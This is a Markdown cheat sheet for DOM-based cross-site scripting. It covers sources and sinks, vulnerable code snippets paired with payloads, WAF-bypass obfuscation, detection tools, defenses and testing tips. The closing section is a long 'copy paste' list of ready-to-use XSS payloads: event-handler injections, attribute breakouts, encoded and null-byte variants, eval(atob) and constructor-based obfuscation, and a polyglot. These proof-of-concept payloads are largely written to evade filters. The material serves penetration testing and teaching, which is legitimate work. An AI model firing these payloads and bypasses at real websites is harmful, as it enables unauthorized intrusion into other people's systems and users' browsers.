# DOM-BASED XSS PAYLOADS COMPLETE CHEAT SHEET

## 1. BASIC DOM XSS PAYLOADS (Generic)
These payloads work when injected into client-side JavaScript that writes to the DOM without sanitization. They are the same as reflected/stored XSS but the injection occurs entirely in the browser.

```
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>print()</script>
<script>console.log('XSS')</script>
<script>document.write('XSS')</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert('XSS')>
<svg onload=alert(1)>
<svg onload=alert('XSS')>
<body onload=alert(1)>
<details ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<a href="javascript:alert(1)">Click</a>
javascript:alert(1)
javascript:confirm(1)
javascript:prompt(1)
javascript:console.log('XSS')
javascript:print()
```

---

## 2. SOURCES (Injection Points)
These are the client-side data sources that an attacker can control. Always treat them as untrusted.

| Source | JavaScript Example |
|--------|-------------------|
| `document.URL` | `var url = document.URL;` |
| `document.documentURI` | `var uri = document.documentURI;` |
| `document.location` (and `.href`, `.pathname`, `.hash`, `.search`) | `var hash = location.hash;` |
| `window.name` | `var name = window.name;` |
| `document.referrer` | `var ref = document.referrer;` |
| `document.cookie` | `var cookie = document.cookie;` |
| `postMessage()` | `window.addEventListener("message", ...)` |
| `localStorage` / `sessionStorage` | `localStorage.getItem("x")` |
| `history.pushState` / `replaceState` | Data in the friendly URL. |

---

## 3. SINKS (Dangerous Functions)
These are the functions where untrusted data must never be passed without sanitization.

| Category | Dangerous Sink | Risk |
|----------|----------------|------|
| **HTML Writing** | `element.innerHTML =` | Direct XSS (inserts tags). |
| **HTML Writing (deprecated)** | `document.write()` | Direct XSS. |
| **HTML Writing** | `element.outerHTML =` | Direct XSS. |
| **JS Execution** | `eval()` | Arbitrary code execution. |
| **JS Execution** | `setTimeout()` / `setInterval()` | If first argument is a string. |
| **JS Execution** | `Function("...")` / `new Function` | Function constructor. |
| **Navigation** | `location.href` / `location.assign()` | Redirect to `javascript:alert(1)`. |
| **Navigation** | `window.open()` | Malicious redirect. |
| **DOM / Attributes** | `element.setAttribute("onclick", ...)` | Event injection. |
| **DOM / Attributes** | `element.src =` (if script/iframe) | External script loading. |
| **CSS** | `element.style =` / `element.cssText` | Possible exfiltration or DoS. |
| **jQuery** | `.html()`, `.append()`, `.before()`, `.after()`, `.prepend()` | Direct XSS if not sanitized. |

---

## 4. CONTEXT-SPECIFIC PAYLOADS

### A. DOM XSS via `location.hash` (innerHTML sink)
Vulnerable code:
```javascript
let name = location.hash.substring(1);
document.getElementById("greeting").innerHTML = "Hello " + name;
```
Payload:
```
https://victim.com/#<img src=x onerror=alert(1)>
```

### B. DOM XSS via `document.write` (referrer sink)
Vulnerable code:
```javascript
let ref = document.referrer;
document.write("<a href='" + ref + "'>Back</a>");
```
Payload (needs to arrive from a malicious site):
```
https://attacker.com/?q=' onmouseover=alert(1) '
```
Result: `<a href='https://attacker.com/?q=' onmouseover=alert(1) ''>`

### C. DOM XSS via `eval` (search sink)
Vulnerable code:
```javascript
let action = location.search.split("=")[1];
eval("var result = " + action);
```
Payload:
```
https://victim.com/?callback=alert(1)
```

### D. DOM XSS via `postMessage`
Vulnerable code:
```javascript
window.addEventListener("message", function(e) {
  document.getElementById("output").innerHTML = e.data;
});
```
Payload (from attacker page):
```javascript
window.postMessage("<img src=x onerror=alert(1)>", "*");
```

### E. DOM XSS via `localStorage`
Vulnerable code:
```javascript
document.getElementById("div").innerHTML = localStorage.getItem("userInput");
```
Payload (inject once, persists):
```javascript
localStorage.setItem("userInput", "<img src=x onerror=alert(1)>");
```

### F. DOM XSS via `setTimeout` with string
Vulnerable code:
```javascript
setTimeout("var x = " + userInput, 100);
```
Payload:
```
alert(1)
```

### G. DOM XSS via `location.href`
Vulnerable code:
```javascript
location.href = userInput;
```
Payload:
```
javascript:alert(1)
```

### H. DOM XSS via jQuery `.html()`
Vulnerable code:
```javascript
$("#div").html(userInput);
```
Payload:
```
<img src=x onerror=alert(1)>
```

---

## 5. OBFUSCATION / WAF BYPASS TECHNIQUES
If the WAF inspects the URL but the vulnerable JS uses `decodeURIComponent` or `atob`, try these:

| Technique | Example |
|-----------|---------|
| **Double URL encoding** | `%253C` → `%3C` → `<` |
| **Unicode** | `\u003c` → `<` |
| **Base64** (if JS uses `atob`) | `payload = atob("PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")` |
| **String concatenation** | `al` + "ert" + "(1)" |
| **HTML entities** | `&#60;script&#62;alert(1)&#60;/script&#62;` |
| **Hex encoding** | `%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E` |
| **Null byte** | `%3Cscr%00ipt%3Ealert(1)%3C/scr%00ipt%3E` |

---

## 6. TOOLS FOR DETECTION

| Tool | Usage |
|------|-------|
| **Browser DevTools (F12)** | Inspect elements, Console, Sources. |
| **DOM Invader (Burp Suite)** | Integrated plugin to automate DOM testing. Injects into all sources. |
| **Retire.js** | Detects JS libraries with known DOM vulnerabilities (e.g., jQuery < 3.0). |
| **Google CSP Evaluator** | Checks if your CSP mitigates XSS. |
| **Manual Fuzzing** | Send special characters: `'"><svg/onload=alert(1)>` and see where they render. |

---

## 7. DEFENSE / PREVENTION

| Rule | Explanation |
|------|-------------|
| **1. Use `textContent` instead of `innerHTML`** | `textContent` escapes automatically, does not execute HTML. |
| **2. Never use `eval()` or `new Function()`** | No excuse. If you use it, you're asking for a hack. |
| **3. Sanitize before `innerHTML`** | Use libraries like **DOMPurify** to clean HTML. |
| **4. Use `encodeURIComponent`** | For building dynamic URLs. |
| **5. Escape data in `setTimeout`** | Never pass strings as first argument; pass anonymous functions. |
| **6. Content Security Policy (CSP)** | Configure `script-src 'self'` and `object-src 'none'` to mitigate. |
| **7. Validate `postMessage`** | Always check `event.origin` before processing the message. |

---

## 8. TIPS FOR TESTING

1. Identify sources: look for `location`, `document.URL`, `window.name`, etc.
2. Trace the data: where is that variable used?
3. Identify the sink: does it go to `innerHTML`, `eval`, `write`, or `href`?
4. Inject payload: use `<svg/onload=alert(1)>` or `javascript:alert(1)`.
5. Verify context: are you inside an `onclick` attribute? Inside `<script>`? Adjust payload (quotes, escapes).
6. If it doesn't work: try double URL encoding.
7. Use `console.log('XSS')` if popups are blocked.
8. Check if the payload persists (stored DOM XSS) or only triggers on load.
9. For `postMessage`, test with different origins and data types.
10. Always test on your own account first.

---

## 9. QUICK REFERENCE – SOURCES & SINKS

| Character | URL Encoding | Purpose |
|-----------|--------------|---------|
| `<` | `%3C` | Tag start |
| `>` | `%3E` | Tag end |
| `"` | `%22` | Attribute delimiter |
| `'` | `%27` | Attribute delimiter |
| `/` | `%2F` | Closing tag |
| `(` | `%28` | Function call |
| `)` | `%29` | Function call |
| ` ` | `%20` | Space |

| Source | Sink | Payload Example |
|--------|------|-----------------|
| `location.hash` | `innerHTML` | `#<img src=x onerror=alert(1)>` |
| `location.search` | `eval` | `?callback=alert(1)` |
| `document.referrer` | `document.write` | `' onmouseover=alert(1) '` |
| `window.name` | `innerHTML` | `<svg onload=alert(1)>` |
| `postMessage` | `innerHTML` | `<img src=x onerror=alert(1)>` |
| `localStorage` | `innerHTML` | `<script>alert(1)</script>` |
| `location.href` | `location.href` | `javascript:alert(1)` |
| `setTimeout` (string) | `eval` | `alert(1)` |

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>print()</script>
<script>console.log('XSS')</script>
<script>document.write('XSS')</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert('XSS')>
<svg onload=alert(1)>
<svg onload=alert('XSS')>
<body onload=alert(1)>
<details ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<a href="javascript:alert(1)">Click</a>
javascript:alert(1)
javascript:confirm(1)
javascript:prompt(1)
javascript:console.log('XSS')
javascript:print()
" onmouseover="alert(1)
" onclick="alert(1)
" autofocus onfocus="alert(1)
" onerror="alert(1)
" onload="alert(1)
" onmouseout="alert(1)
" onkeydown="alert(1)
" onkeyup="alert(1)
" onchange="alert(1)
" oninput="alert(1)
" oninvalid="alert(1)
" onreset="alert(1)
" onselect="alert(1)
" onsubmit="alert(1)
' onmouseover='alert(1)
' onclick='alert(1)
' autofocus onfocus='alert(1)
' onerror='alert(1)
' onload='alert(1)
' onmouseout='alert(1)
' onkeydown='alert(1)
' onkeyup='alert(1)
' onchange='alert(1)
' oninput='alert(1)
' oninvalid='alert(1)
' onreset='alert(1)
' onselect='alert(1)
' onsubmit='alert(1)
"><script>alert(1)</script>
'><script>alert(1)</script>
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
'><svg onload=alert(1)>
</title><script>alert(1)</script>
</textarea><script>alert(1)</script>
</style><script>alert(1)</script>
';alert(1)//
";alert(1)//
';alert(1);//
";alert(1);//
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src=x%20onerror=alert(1)%3E
%3Csvg%20onload=alert(1)%3E
%3Cbody%20onload=alert(1)%3E
%3Cdetails%20ontoggle=alert(1)%3E
&#60;script&#62;alert(1)&#60;/script&#62;
&#60;img src=x onerror=alert(1)&#62;
&#60;svg onload=alert(1)&#62;
&#60;body onload=alert(1)&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
&#x3C;img src=x onerror=alert(1)&#x3E;
&#x3C;svg onload=alert(1)&#x3E;
%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E
%25253Cimg%252520src=x%252520onerror=alert(1)%25253E
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%31%29%3E
\u003Cscript\u003Ealert(1)\u003C/script\u003E
\u003Cimg src=x onerror=alert(1)\u003E
%3Cscr%00ipt%3Ealert(1)%3C/scr%00ipt%3E
%3Cimg%00src=x%00onerror=alert(1)%3E
%3Csvg%00onload=alert(1)%3E
<script>window['ale'+'rt'](1)</script>
<img src=x onerror="top['al'+'ert'](1)">
<svg onload="self['ale'+'rt'](1)">
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<svg onload="eval(atob('YWxlcnQoMSk='))">
<script>Function('ale'+'rt(1)')()</script>
<img src=x onerror="Function('ale'+'rt(1)')()">
<svg onload="Function('alert(1)')()">
<script>setTimeout('ale'+'rt(1)',0)</script>
<img src=x onerror="setTimeout('ale'+'rt(1)',0)">
<svg onload="setInterval('ale'+'rt(1)',100)">
<script>''.constructor.constructor('alert(1)')()</script>
<img src=x onerror="[].slice.constructor('alert(1)')()">
<svg onload="Object.constructor('alert(1)')()">
<script>window['\u0061\u006c\u0065\u0072\u0074'](1)</script>
<img src=x onerror="window['\x61\x6c\x65\x72\x74'](1)">
<scr&#x69;pt>alert(1)</scr&#x69;pt>
<im&#x67; src=x onerror=alert(1)>
<svg onload=&#x61;lert(1)>
<a href="jav&#x61;script:alert(1)">Click</a>
<a href="jav%61script:alert(1)">Click</a>
<a href="%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29">Click</a>
<script>document.body.innerHTML='<h1>XSS</h1>'</script>
<img src=x onerror="document.title='XSS'">
<svg onload="document.background='red'">
<img src=x onerror="document.write('<h1>XSS</h1>')">
<script>window.location='#XSS'</script>
<img src=x onerror="location='#XSS'">
<svg onload="top.location='#XSS'">
<script>console.log('XSS')</script>
<img src=x onerror="console.warn('XSS found')">
<svg onload="console.error('XSS')">
<script>console.trace('XSS')</script>
javascript:alert(1)//--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(42);//'>
"<img src=\"x\" onerror=\"alert(1)\">"
"<img src=\"x\" onerror=\"alert('XSS')\">"
"<svg onload=\"alert(1)\">"
"<body onload=\"alert(1)\">"
"<script>alert(1)</script>"
```
